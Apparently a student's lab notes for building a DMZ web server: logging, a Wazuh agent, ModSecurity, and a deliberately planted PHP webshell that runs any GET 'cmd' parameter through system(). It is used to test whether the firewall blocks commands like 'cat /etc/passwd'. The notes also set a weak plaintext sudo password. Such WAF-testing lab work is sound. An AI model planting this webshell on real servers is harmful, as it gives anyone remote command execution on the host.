# WEB01 Configuration

## Basic Setup
- Set hostname to `web01-charlotte`
- Add sudo user `charlotte:password`
- Set network via nmtui:
  - IP Address: `172.16.50.3/29`
  - Gateway & DNS: `172.16.50.2`
  - Network adapter: DMZ

## Install and Configure HTTPD
```
# Install apache web server
sudo yum install httpd
sudo systemctl enable httpd
sudo systemctl start httpd

# If you need to edit the main config file:
sudo vi /etc/httpd/conf/httpd.conf
```

## Rsyslog Configuration

### Install rsyslog (if not installed)
```
sudo yum install rsyslog
```

### Configure Rsyslog for High Precision Timestamps
Edit `/etc/rsyslog.conf` and add these lines:
```
$ActionFileDefaultTemplate RSYSLOG_SyslogProtocol23Format
template(name="BetterTiming" type="string" string="%timestamp:::date-rfc3339% %HOSTNAME% %syslogtag%%msg%\n")
```
Note: ModSecurity will prevent dangerous commands like cat /etc/passwd while allowing safe commands like whoami and /sbin/ifconfig.
Apply the template to the desired log file:
```
# Example: Add ;BetterTiming suffix to a log destination
*.info;mail.none;authpriv.none;cron.none                /var/log/messages;BetterTiming
```

### Configure Log Forwarding (when log01 is active)
Create a file at `/etc/rsyslog.d/sec350.conf` with these contents:
```
# For general logging
user.notice @172.16.50.5

# For authentication logging
authpriv.* @172.16.50.5
```

Restart rsyslog:
```
sudo systemctl restart rsyslog
```

## Install Wazuh Agent
```
# Download and install Wazuh agent
curl -o wazuh-agent-4.7.5-1.x86_64.rpm https://packages.wazuh.com/4.x/yum/wazuh-agent-4.7.5-1.x86_64.rpm && sudo WAZUH_MANAGER='172.16.200.10' WAZUH_AGENT_GROUP='linux' WAZUH_AGENT_NAME='web01-charlotte' rpm -ihv wazuh-agent-4.7.5-1.x86_64.rpm

# Start the agent
sudo systemctl daemon-reload
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent
```

## CentOS Repo Fix (if needed)
```
sudo sed -i s/mirror.centos.org/vault.centos.org/g /etc/yum.repos.d/CentOS-*.repo
sudo sed -i s/^#.*baseurl=http/baseurl=http/g /etc/yum.repos.d/CentOS-*.repo
sudo sed -i s/^mirrorlist=http/#mirrorlist=http/g /etc/yum.repos.d/CentOS-*.repo
```


## Web Application Firewall (ModSecurity)
Install ModSecurity and PHP:
```bash
sudo yum install mod_security mod_security_crs php php-common php-opcache php-cli php-gd php-curl php-mysqlnd -y
```

## Create Test PHP Webshell
Create `/var/www/html/shell.php` with the following content:
```
<!-- source: https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985 -->
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
> [!Note]
> ModSecurity will prevent dangerous commands like `cat /etc/passwd` while allowing safe commands like `whoami` and `/sbin/ifconfig`.
